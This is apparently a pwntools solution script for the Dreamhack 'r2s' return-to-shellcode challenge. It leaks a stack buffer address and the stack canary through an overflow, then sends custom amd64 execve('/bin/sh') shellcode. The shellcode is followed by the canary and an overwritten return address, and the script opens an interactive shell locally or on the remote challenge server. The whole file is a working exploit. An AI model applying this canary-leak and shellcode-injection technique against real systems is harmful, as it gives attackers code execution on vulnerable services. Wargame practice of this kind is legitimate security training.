#!/usr/bin/python3

from pwn import *

exe = ELF("./r2s")

context.binary = exe
shellcode = asm(shellcraft.sh())

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         b *main+239
#         c
#         ''')
#         input()


if args.REMOTE:
    p = remote('host3.dreamhack.games ', 21293)
else:
    p = process([exe.path])
# GDB()
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1],16)
print(hex(buf))
payload = b'A' * 88
sla(b'Input: ', payload)
p.recvuntil(b'A' * 88)
p.recv(1)
canary = u64(b'\0' + p.recv(7))
print(hex(canary))
# stack_leak = u64(p.recv(6) + b'\0\0')
# print(hex(stack_leak))

shellcode = asm('''
    sub rsp, 0x200
    mov rax, 29400045130965551
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch='amd64')
payload = shellcode.ljust(88, b'A')
payload += p64(canary)
payload += p64(0)
payload += p64(buf)
sla(b'Input: ', payload)
p.interactive()

